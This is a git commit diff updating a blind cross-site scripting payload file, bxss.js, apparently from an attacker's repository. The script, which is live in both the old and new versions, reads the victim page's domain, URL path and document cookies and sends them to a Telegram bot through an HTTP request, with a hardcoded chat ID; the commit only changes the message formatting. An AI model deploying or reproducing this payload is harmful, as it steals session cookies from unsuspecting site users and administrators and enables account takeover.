fc1ef5610c2b019fd63beaf2989c33bf1fd8142c
trhacknon <129875733+tucommenceapousser@users.noreply.github.com>
2023-06-18 00:45:07 +0200

    Update bxss.js

--- bxss.js
+++ bxss.js
@@ -12,9 +12,10 @@ var chatId = '-1001690993326'; // Your "chatId" Here
 */
 
 function telegramSend(tokenBot, chatId) {
-	var textData = '<b>Blind+xss+by+Trhacknon</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
+    var textData = '<b>Blind XSS by trhacknon</b>%0d%0a%0d%0a<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
     xhr.send();
 }
-telegramSend(tokenBot, chatId)
+
+telegramSend(tokenBot, chatId);
